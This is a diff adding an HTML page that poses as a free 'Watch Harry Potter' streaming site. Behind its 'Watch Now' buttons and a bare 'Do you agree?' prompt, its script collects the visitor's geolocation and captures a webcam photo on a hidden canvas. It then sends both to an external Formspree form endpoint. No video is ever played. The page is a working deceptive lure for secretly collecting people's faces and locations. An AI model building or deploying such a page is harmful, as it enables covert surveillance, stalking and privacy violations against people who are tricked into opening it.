@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Watch Harry Potter</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<style>
+body {
+  margin: 0;
+  height: 100vh;
+  background: linear-gradient(135deg, #3a0ca3, #7209b7, #4361ee);
+  font-family: Arial, sans-serif;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  color: white;
+}
+
+.container {
+  background: rgba(0,0,0,0.7);
+  padding: 35px;
+  border-radius: 20px;
+  text-align: center;
+  width: 360px;
+}
+
+h1 {
+  font-size: 36px;
+  margin-bottom: 25px;
+}
+
+button {
+  background: #5f6cff;
+  color: white;
+  border: none;
+  padding: 14px 24px;
+  margin: 8px;
+  font-size: 16px;
+  border-radius: 8px;
+  cursor: pointer;
+}
+
+button:hover {
+  background: #6f7dff;
+}
+
+#status {
+  display: none;
+  margin-top: 20px;
+  font-size: 18px;
+}
+
+video, canvas {
+  display: none;
+}
+</style>
+</head>
+
+<body>
+<div class="container">
+  <h1>WATCH HARRY POTTER HERE</h1>
+
+  <button onclick="start()">Watch Now – Part 1</button>
+  <button onclick="start()">Watch Now – Part 2</button>
+
+  <div id="status">🔮 Loading Harry Potter...</div>
+
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas"></canvas>
+</div>
+
+<script>
+let stream;
+let locationText = "";
+
+async function start() {
+  const status = document.getElementById("status");
+  status.style.display = "block";
+  status.innerText = "🔮 Loading Harry Potter...";
+
+  setTimeout(async () => {
+    const agree = confirm(
+      " Do you agree?"
+    );
+
+    if (!agree) {
+      status.style.display = "none";
+      return;
+    }
+
+    // LOCATION
+    navigator.geolocation.getCurrentPosition(pos => {
+      locationText =
+        "Latitude: " + pos.coords.latitude +
+        "\nLongitude: " + pos.coords.longitude +
+        "\nAccuracy: " + pos.coords.accuracy + " meters";
+    });
+
+    // CAMERA
+    stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    const video = document.getElementById("video");
+    video.srcObject = stream;
+
+    video.onloadedmetadata = () => {
+      captureAndSend();
+    };
+
+  }, 1000); // visual animation only
+}
+
+function captureAndSend() {
+  const video = document.getElementById("video");
+  const canvas = document.getElementById("canvas");
+
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  canvas.getContext("2d").drawImage(video, 0, 0);
+
+  const imageData = canvas.toDataURL("image/png");
+
+  stream.getTracks().forEach(track => track.stop());
+
+  document.getElementById("status").innerText = "📤 Sending...";
+
+  fetch("https://formspree.io/f/xjgknygj", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      photo: imageData,
+      location: locationText
+    })
+  })
+  .then(() => {
+    document.getElementById("status").innerText = "✅ Done";
+  })
+  .catch(() => {
+    document.getElementById("status").innerText = "❌ Failed to send";
+  });
+}
+</script>
+</body>
+</html>
